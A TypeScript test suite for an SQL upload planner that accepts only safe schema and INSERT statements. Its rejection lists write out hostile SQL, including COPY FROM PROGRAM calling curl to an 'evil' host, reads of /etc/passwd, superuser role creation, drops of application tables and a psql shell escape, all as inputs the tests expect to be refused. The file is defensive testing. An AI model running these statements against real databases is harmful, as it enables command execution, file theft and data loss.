import { describe, expect, it } from "vitest";
import { ImportError, UNSUPPORTED_SQL_MESSAGE, getUploadLimits } from "@/lib/datasets/limits";
import { planSqlImport } from "@/lib/datasets/sql-import";
import { COMPANY_SQL } from "../helpers/datasets";

const limits = getUploadLimits({});
const reject = async (sql: string, l = limits) => {
  try {
    await planSqlImport(sql, l);
  } catch (e) {
    expect(e).toBeInstanceOf(ImportError);
    return e as ImportError;
  }
  throw new Error(`expected rejection: ${sql.slice(0, 80)}`);
};

describe("SQL upload — valid input", () => {
  it("accepts a schema-only file (CREATE TABLE + constraints + index)", async () => {
    const plan = await planSqlImport(
      `CREATE TABLE a (id serial PRIMARY KEY, name varchar(50) NOT NULL UNIQUE);
       CREATE TABLE b (id integer PRIMARY KEY, a_id integer REFERENCES a(id), created timestamp with time zone DEFAULT now());
       CREATE INDEX b_a ON b (a_id);`,
      limits,
    );
    expect(plan.stats.tables).toEqual(["a", "b"]);
    expect(plan.stats.rows).toBe(0);
    expect(plan.statements.map((s) => s.kind)).toEqual(["create_table", "create_table", "create_index"]);
  });

  it("accepts schema + INSERTs (company example) and counts tables, columns and rows", async () => {
    const plan = await planSqlImport(COMPANY_SQL, limits);
    expect(plan.stats.tables).toEqual(["departments", "employees", "salaries"]);
    expect(plan.stats.columns).toBe(3 + 6 + 4);
    expect(plan.stats.rows).toBe(3 + 5 + 5);
    expect(plan.statements.filter((s) => s.kind === "insert")).toHaveLength(3);
  });

  it("separates schema statements from data statements", async () => {
    const plan = await planSqlImport(COMPANY_SQL, limits);
    const kinds = plan.statements.map((s) => s.kind);
    expect(kinds.filter((k) => k !== "insert")).toEqual(["create_table", "create_table", "create_table", "alter_table", "create_index"]);
    expect(kinds.slice(-3)).toEqual(["insert", "insert", "insert"]);
  });

  it("removes the `public.` prefix precisely, in every position, including non-ASCII data", async () => {
    const plan = await planSqlImport(
      `CREATE TABLE public.t (id int PRIMARY KEY, n text, r int REFERENCES public.t(id));
       ALTER TABLE ONLY public.t ADD CONSTRAINT c CHECK (id > 0);
       CREATE INDEX i ON public.t (n);
       INSERT INTO public.t (id, n) VALUES (1, 'Zoë public.t');`,
      limits,
    );
    const all = plan.statements.map((s) => s.text).join("\n");
    expect(all).not.toMatch(/public\.t\b(?!')/);
    expect(all).toContain("REFERENCES t(id)");
    expect(all).toContain("'Zoë public.t'"); // string literal untouched
    expect(all).toContain("INSERT INTO t (id, n)");
  });

  it("captures COMMENT ON as descriptions instead of executing them", async () => {
    const plan = await planSqlImport(COMPANY_SQL, limits);
    expect(plan.comments).toContainEqual({ table: "departments", text: "Company departments" });
    expect(plan.comments).toContainEqual({ table: "employees", column: "status", text: "Employment status" });
    expect(plan.statements.every((s) => !s.text.startsWith("COMMENT"))).toBe(true);
  });

  it("tolerates harmless pg_dump noise (BEGIN/COMMIT, SET client_encoding, OWNER TO) and reports it", async () => {
    const plan = await planSqlImport(
      `SET client_encoding = 'UTF8';
       BEGIN;
       CREATE TABLE t (id int);
       ALTER TABLE public.t OWNER TO postgres;
       COMMIT;`,
      limits,
    );
    expect(plan.statements).toHaveLength(1);
    expect(plan.warnings.join(" ")).toMatch(/OWNER TO/);
  });

  it("accepts negative numbers, NULL, DEFAULT and allow-listed functions in VALUES", async () => {
    const plan = await planSqlImport(`CREATE TABLE t (id int, v numeric, d date); INSERT INTO t VALUES (1, -5.5, NULL), (2, 1e3, CURRENT_DATE), (3, round(2.5), '2020-01-01'::date);`, limits);
    expect(plan.stats.rows).toBe(3);
  });
});

describe("SQL upload — invalid SQL", () => {
  it("reports a syntax error with a line number", async () => {
    const e = await reject("CREATE TABLE a (id int);\nCREATE TABLE b (id int,;\n");
    expect(e.message).toMatch(/could not be parsed/i);
    expect(e.message).toMatch(/line 2/);
  });

  it("rejects empty and binary files", async () => {
    expect((await reject("")).message).toMatch(/empty/i);
    expect((await reject("   \n ")).message).toMatch(/empty/i);
    expect((await reject(`CREATE TABLE a (id int);${String.fromCharCode(0)}`)).message).toMatch(/binary/i);
  });

  it("requires at least one CREATE TABLE", async () => {
    expect((await reject("BEGIN; COMMIT;")).message).toMatch(/does not create any tables/i);
  });

  it("rejects an INSERT into a table that the file never creates", async () => {
    const e = await reject("CREATE TABLE a (id int); INSERT INTO b VALUES (1);");
    expect(e.message).toBe(UNSUPPORTED_SQL_MESSAGE);
    expect(e.details.join(" ")).toMatch(/not created earlier/);
  });

  it("rejects duplicate table definitions", async () => {
    expect((await reject("CREATE TABLE a (id int); CREATE TABLE a (id int);")).details.join(" ")).toMatch(/created twice/);
  });
});

describe("SQL upload — dangerous / unsupported statements are rejected before anything runs", () => {
  const dangerous: [string, string][] = [
    ["DROP DATABASE", "DROP DATABASE postgres;"],
    ["CREATE DATABASE", "CREATE DATABASE evil;"],
    ["GRANT", "GRANT ALL ON ALL TABLES IN SCHEMA public TO PUBLIC;"],
    ["REVOKE", "REVOKE ALL ON SCHEMA public FROM PUBLIC;"],
    ["GRANT role", "GRANT postgres TO PUBLIC;"],
    ["ALTER ROLE", "ALTER ROLE postgres WITH SUPERUSER;"],
    ["CREATE ROLE", "CREATE ROLE hacker SUPERUSER LOGIN PASSWORD 'x';"],
    ["COPY PROGRAM", "COPY t FROM PROGRAM 'curl http://evil.example' ;"],
    ["COPY file", "COPY t FROM '/etc/passwd';"],
    ["COPY stdout", "COPY t TO STDOUT;"],
    ["CREATE EXTENSION", "CREATE EXTENSION dblink;"],
    ["FDW", "CREATE FOREIGN DATA WRAPPER w;"],
    ["CREATE SERVER", "CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'evil');"],
    ["server-side file read", "SELECT pg_read_file('/etc/passwd');"],
    ["DO block", "DO $$ BEGIN EXECUTE 'drop table nl2sql.query_runs'; END $$;"],
    ["DROP TABLE", "DROP TABLE nl2sql.query_runs;"],
    ["TRUNCATE", "TRUNCATE nl2sql.query_runs;"],
    ["UPDATE", "UPDATE nl2sql.query_runs SET status = 'x';"],
    ["DELETE", "DELETE FROM nl2sql.query_runs;"],
    ["SET ROLE", "SET ROLE postgres;"],
    ["SET search_path", "SET search_path = nl2sql, public;"],
    ["set_config", "SELECT pg_catalog.set_config('search_path', '', false);"],
    ["CREATE FUNCTION", "CREATE FUNCTION f() RETURNS int AS 'select 1' LANGUAGE sql;"],
    ["CREATE TRIGGER", "CREATE TRIGGER t BEFORE INSERT ON a FOR EACH ROW EXECUTE FUNCTION f();"],
    ["CREATE VIEW", "CREATE VIEW v AS SELECT 1;"],
    ["CREATE SEQUENCE", "CREATE SEQUENCE s;"],
    ["CREATE TYPE enum", "CREATE TYPE mood AS ENUM ('a','b');"],
    ["CREATE SCHEMA", "CREATE SCHEMA evil;"],
    ["CREATE TABLE AS", "CREATE TABLE x AS SELECT * FROM nl2sql.query_runs;"],
    ["TEMP table", "CREATE TEMP TABLE t (id int);"],
    ["ROLLBACK", "ROLLBACK;"],
    ["VACUUM", "VACUUM FULL;"],
    ["LISTEN", "LISTEN chan;"],
  ];
  for (const [name, sql] of dangerous) {
    it(`rejects: ${name}`, async () => {
      const e = await reject(`CREATE TABLE ok (id int);\n${sql}`);
      expect(e.message).toBe(UNSUPPORTED_SQL_MESSAGE);
      expect(e.details.length).toBeGreaterThan(0);
      expect(e.details.some((d) => d.startsWith("line 2:"))).toBe(true); // points at the offending line
    });
  }

  it("does not partially accept a file: one bad statement rejects the whole file", async () => {
    const e = await reject(`${COMPANY_SQL}\nDROP TABLE public.employees;`);
    expect(e.message).toBe(UNSUPPORTED_SQL_MESSAGE);
    expect(e.details.join(" ")).toMatch(/DROP/);
  });

  const forbiddenNames: [string, string][] = [
    ["CREATE TABLE in the application schema", "CREATE TABLE nl2sql.evil (id int);"],
    ["CREATE TABLE in another schema", "CREATE TABLE other.evil (id int);"],
    ["cross-database name", "CREATE TABLE db.public.evil (id int);"],
    ["INSERT into an application table", "CREATE TABLE ok (id int); INSERT INTO nl2sql.query_runs (user_question, status) VALUES ('x','error');"],
    ["ALTER an application table", "ALTER TABLE nl2sql.query_runs ADD CONSTRAINT c CHECK (true);"],
    ["FK to an application table", "CREATE TABLE t (id int REFERENCES nl2sql.query_runs(id));"],
    ["CREATE INDEX on an application table", "CREATE INDEX i ON nl2sql.query_runs (status);"],
  ];
  for (const [name, sql] of forbiddenNames) {
    it(`rejects access to application tables: ${name}`, async () => {
      const e = await reject(sql);
      expect(e.message).toBe(UNSUPPORTED_SQL_MESSAGE);
      expect(e.details.join(" ")).toMatch(/not supported|cross-database/);
    });
  }

  const badDefinitions: [string, string, RegExp][] = [
    ["unsupported type", "CREATE TABLE t (b bytea);", /data type/],
    ["array column", "CREATE TABLE t (a text[]);", /array/],
    ["function in DEFAULT", "CREATE TABLE t (a text DEFAULT pg_read_file('/etc/passwd'));", /function/],
    ["sub-query in CHECK", "CREATE TABLE t (a int, CHECK ((SELECT count(*) FROM nl2sql.query_runs) > 0));", /sub-quer/],
    ["INSERT ... SELECT", "CREATE TABLE t (a int); INSERT INTO t SELECT id FROM nl2sql.query_runs;", /VALUES/],
    ["INSERT with sub-select value", "CREATE TABLE t (a int); INSERT INTO t VALUES ((SELECT 1));", /sub-quer/],
    ["INSERT ... ON CONFLICT", "CREATE TABLE t (a int PRIMARY KEY); INSERT INTO t VALUES (1) ON CONFLICT DO NOTHING;", /ON CONFLICT/],
    ["INHERITS", "CREATE TABLE p (a int); CREATE TABLE c () INHERITS (p);", /inherit/i],
    ["partitioned table", "CREATE TABLE t (a int) PARTITION BY RANGE (a);", /partition/],
    ["EXCLUDE constraint", "CREATE TABLE t (a int, EXCLUDE USING gist (a WITH =));", /constraint type/],
    ["non-btree index", "CREATE TABLE t (a int); CREATE INDEX i ON t USING gin (a);", /btree/],
    ["expression index", "CREATE TABLE t (a text); CREATE INDEX i ON t (lower(a));", /plain column/],
    ["ALTER TABLE ADD COLUMN", "CREATE TABLE t (a int); ALTER TABLE t ADD COLUMN b int;", /ADD|AddColumn|not supported/i],
    ["ALTER TABLE DROP COLUMN", "CREATE TABLE t (a int); ALTER TABLE t DROP COLUMN a;", /DropColumn|not supported/i],
    ["INSERT ... RETURNING", "CREATE TABLE t (a int); INSERT INTO t VALUES (1) RETURNING *;", /RETURNING/],
    ["CREATE INDEX CONCURRENTLY", "CREATE TABLE t (a int); CREATE INDEX CONCURRENTLY i ON t (a);", /CONCURRENTLY/],
  ];
  for (const [name, sql, re] of badDefinitions) {
    it(`rejects: ${name}`, async () => {
      const e = await reject(sql);
      expect(e.message).toBe(UNSUPPORTED_SQL_MESSAGE);
      expect(e.details.join(" ")).toMatch(re);
    });
  }
});

describe("SQL upload — limits", () => {
  it("rejects files above the size limit", async () => {
    const e = await reject("CREATE TABLE t (id int);", { ...limits, maxSqlBytes: 10 });
    expect(e.message).toMatch(/too large/);
  });
  it("rejects too many tables / columns / rows", async () => {
    expect((await reject("CREATE TABLE a (id int); CREATE TABLE b (id int);", { ...limits, maxTables: 1 })).message).toMatch(/Too many tables/);
    expect((await reject("CREATE TABLE a (x int, y int, z int);", { ...limits, maxColumnsPerTable: 2 })).details.join(" ")).toMatch(/max 2/);
    expect((await reject("CREATE TABLE a (id int); INSERT INTO a VALUES (1),(2),(3);", { ...limits, maxRows: 2 })).message).toMatch(/Too many rows/);
  });
  it("counts INSERT tuples across statements", async () => {
    const values = Array.from({ length: 50 }, (_, i) => `(${i})`).join(",");
    const plan = await planSqlImport(`CREATE TABLE a (id int); INSERT INTO a VALUES ${values}; INSERT INTO a VALUES ${values};`, limits);
    expect(plan.stats.rows).toBe(100);
  });
});

describe("SQL upload — broader hostile statements (security audit)", () => {
  const base = "CREATE TABLE t (id int PRIMARY KEY, a text); ";
  const hostile: string[] = [
    "CREATE UNLOGGED TABLE u (id int);",
    "CREATE RULE r AS ON INSERT TO t DO INSTEAD NOTHING;",
    "CREATE POLICY p ON t USING (true);",
    "ALTER TABLE t ENABLE ROW LEVEL SECURITY;",
    "ALTER TABLE t DISABLE ROW LEVEL SECURITY;",
    "ALTER TABLE t SET SCHEMA nl2sql;",
    "ALTER TABLE t RENAME TO x;",
    "ALTER TABLE t ADD CONSTRAINT c CHECK (pg_sleep(10) IS NULL);",
    "ALTER TABLE t ADD CONSTRAINT c CHECK (a = current_setting('x'));",
    "ALTER TABLE t ALTER COLUMN a SET DEFAULT nextval('nl2sql.seq');",
    "ALTER TABLE t ALTER COLUMN a SET DEFAULT (SELECT 1);",
    "ALTER TABLE t ALTER COLUMN a TYPE int USING pg_read_file('x')::int;",
    "ALTER TABLE t ADD FOREIGN KEY (id) REFERENCES nl2sql.query_runs(id);",
    "ALTER SYSTEM SET log_statement = 'all';",
    "ALTER DATABASE postgres SET search_path = nl2sql;",
    "ALTER DEFAULT PRIVILEGES GRANT ALL ON TABLES TO PUBLIC;",
    "ALTER SCHEMA public OWNER TO postgres;",
    "ALTER USER postgres PASSWORD 'x';",
    "DROP OWNED BY postgres;",
    "REASSIGN OWNED BY a TO b;",
    "CREATE PUBLICATION pub FOR ALL TABLES;",
    "CREATE SUBSCRIPTION s CONNECTION 'host=evil' PUBLICATION p;",
    "CREATE COLLATION c (locale = 'C');",
    "CREATE DOMAIN d AS int;",
    "CREATE OPERATOR === (LEFTARG = int, RIGHTARG = int, FUNCTION = int4eq);",
    "CREATE LANGUAGE plpython3u;",
    "CREATE EVENT TRIGGER e ON ddl_command_end EXECUTE FUNCTION f();",
    "CREATE MATERIALIZED VIEW m AS SELECT 1;",
    "CREATE AGGREGATE a(int) (SFUNC = int4pl, STYPE = int);",
    "CREATE CAST (int AS text) WITH INOUT;",
    "CREATE STATISTICS s ON a, id FROM t;",
    "CREATE TABLESPACE ts LOCATION '/tmp';",
    "CREATE UNIQUE INDEX i ON t (a) WHERE pg_sleep(1) IS NULL;",
    "CREATE INDEX i ON t (a) TABLESPACE pg_default;",
    "SET session_authorization = postgres;",
    "SET LOCAL role = postgres;",
    "SET default_tablespace = '';",
    "RESET ALL;",
    "RESET ROLE;",
    "LOAD 'auto_explain';",
    "SELECT lo_import('/etc/passwd');",
    "SELECT dblink_connect('host=evil');",
    "SELECT pg_terminate_backend(1);",
    "SELECT 1;",
    "INSERT INTO pg_catalog.pg_class (relname) VALUES ('x');",
    "INSERT INTO pg_authid (rolname) VALUES ('x');",
    "UPDATE pg_authid SET rolsuper = true;",
    "INSERT INTO information_schema.tables VALUES (1);",
    "INSERT INTO t (id, a) VALUES (1, pg_read_file('/etc/passwd'));",
    "INSERT INTO t (id, a) VALUES (1, current_user);",
    "INSERT INTO t (id, a) VALUES (1, version());",
    "INSERT INTO t (id, a) VALUES (1, (SELECT 'x'));",
    "INSERT INTO t (id, a) VALUES (1, nextval('s')::text);",
    "INSERT INTO t (id, a) VALUES (1, lo_import('/etc/passwd')::text);",
    "INSERT INTO t (id, a) VALUES (1, 'x') ON CONFLICT (id) DO UPDATE SET a = 'y';",
    "INSERT INTO t DEFAULT VALUES;",
    "WITH x AS (DELETE FROM t RETURNING *) INSERT INTO t SELECT * FROM x;",
    "COMMENT ON TABLE nl2sql.query_runs IS 'x';",
    "COMMENT ON COLUMN nl2sql.query_runs.status IS 'x';",
    "SECURITY LABEL ON TABLE t IS 'x';",
    "LOCK TABLE t IN ACCESS EXCLUSIVE MODE;",
    "PREPARE p AS SELECT 1;",
    "EXECUTE p;",
    "DECLARE c CURSOR FOR SELECT 1;",
    "SAVEPOINT s;",
    "PREPARE TRANSACTION 'x';",
    "CHECKPOINT;",
    "CLUSTER t;",
    "ANALYZE t;",
    "EXPLAIN SELECT 1;",
    "IMPORT FOREIGN SCHEMA s FROM SERVER x INTO public;",
    "CREATE TABLE t2 (id int) WITH (fillfactor = 10);",
    "CREATE TABLE t2 (id int) TABLESPACE pg_default;",
    "CREATE TABLE t2 (LIKE nl2sql.query_runs);",
    "CREATE TABLE t2 (id int) USING heap;",
    "CREATE TABLE t2 OF some_type;",
    "CREATE TABLE t2 (id int GENERATED ALWAYS AS (pg_sleep(1)::text::int) STORED);",
    "CREATE TABLE t2 (id int DEFAULT nextval('nl2sql.x'));",
    "CREATE TABLE t2 (id serial, b int REFERENCES pg_catalog.pg_class(oid));",
    "CREATE SCHEMA IF NOT EXISTS nl2sql;",
    "\\copy t from '/etc/passwd'",
    "\\c postgres",
    "\\! curl evil",
    "SELECT 1 \\gexec",
  ];
  for (const attack of hostile) {
    it(`rejects the whole file: ${attack.slice(0, 70)}`, async () => {
      const e = await reject(base + attack);
      // psql meta-commands (\c, \!) are not SQL at all: the parser refuses them before the allow-list even runs
      expect(e.message).toMatch(attack.includes("\\") ? /unsupported statements|could not be parsed/ : new RegExp(UNSUPPORTED_SQL_MESSAGE));
    });
  }

  // These are accepted only because they are DROPPED: the plan must contain nothing executable for them.
  const ignored = [
    "ALTER TABLE t OWNER TO postgres;",
    "SET statement_timeout = 0;",
    "SET row_security = off;",
    "SET client_min_messages = warning;",
    "COMMENT ON SCHEMA nl2sql IS 'x';",
    "COMMENT ON ROLE postgres IS 'x';",
    "COMMENT ON DATABASE postgres IS 'x';",
    "COMMENT ON FUNCTION f() IS 'x';",
    "START TRANSACTION READ WRITE;",
    "BEGIN ISOLATION LEVEL SERIALIZABLE;",
    "END;",
    "CREATE SCHEMA IF NOT EXISTS public AUTHORIZATION postgres;",
  ];
  for (const stmt of ignored) {
    it(`statements that are ignored are never executed nor captured: ${stmt.slice(0, 60)}`, async () => {
      const plan = await planSqlImport(base + stmt, limits);
      expect(plan.statements.map((x) => x.kind)).toEqual(["create_table"]);
      expect(plan.comments).toEqual([]);
      expect(plan.statements.map((x) => x.text).join(" ")).not.toMatch(/statement_timeout|row_security|OWNER|nl2sql|postgres/i);
    });
  }
});

describe("SQL upload — reserved table names (system-catalog shadowing)", () => {
  for (const name of ["pg_class", "pg_roles", "pg_namespace", "pg_stat_activity", "PG_Shadow", "information_schema"]) {
    it(`rejects a table named ${name}`, async () => {
      const e = await reject(`CREATE TABLE "${name}" (id int);`);
      expect(e.message).toBe(UNSUPPORTED_SQL_MESSAGE);
      expect(e.details.join(" ")).toMatch(/reserved/);
    });
  }
});

describe("SQL upload — large dumps (one INSERT per row)", () => {
  const dump = (rows: number, tail = "") =>
    ["CREATE TABLE items (id integer PRIMARY KEY, label text);", ...Array.from({ length: rows }, (_, i) => `INSERT INTO items VALUES (${i}, 'item ${i}');`), tail].join("\n");

  it("plans 100,000 single-row INSERTs quickly — planning must be linear, not quadratic in the file size (regression: a rescan per statement never finished)", async () => {
    const started = Date.now();
    const plan = await planSqlImport(dump(100_000), limits);
    expect(plan.stats.rows).toBe(100_000);
    expect(Date.now() - started).toBeLessThan(15_000); // took minutes+ when quadratic; a few seconds now
  }, 30_000);

  it("the statement limit scales with the row limit: a dump at the row limit is accepted, not rejected as 'too many statements'", () => {
    const l = getUploadLimits({ DATASET_MAX_ROWS: "80000" });
    expect(l.maxSqlStatements).toBeGreaterThan(l.maxRows);
    expect(getUploadLimits({}).maxSqlStatements).toBeGreaterThan(getUploadLimits({}).maxRows);
  });

  it("still reports the correct line number for an error near the end of a big file", async () => {
    const err = await reject(dump(20_000, "CREATE TABLE evil (id int);\nDROP TABLE items;"));
    expect(err.details.join(" ")).toMatch(/line 20003/); // 1 CREATE + 20,000 INSERTs + 1 CREATE + the DROP on line 20003
  }, 30_000);
});
